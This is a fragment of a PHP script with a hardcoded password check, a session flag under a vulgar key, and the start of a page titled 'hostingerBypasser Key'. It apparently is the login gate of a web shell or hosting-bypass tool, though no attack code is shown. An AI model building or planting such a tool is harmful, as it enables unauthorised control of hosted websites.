...
$allowed_password = 'ngontol';


if (isset($_POST['password'])) {
    if ($_POST['password'] === $allowed_password) {
        $_SESSION['ngentod'] = true;
...
if (!isset($_SESSION['ngentod'])):
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <title>hostingerBypasser</title>
</head>
<body>
    <h2>hostingerBypasser Key</h2>
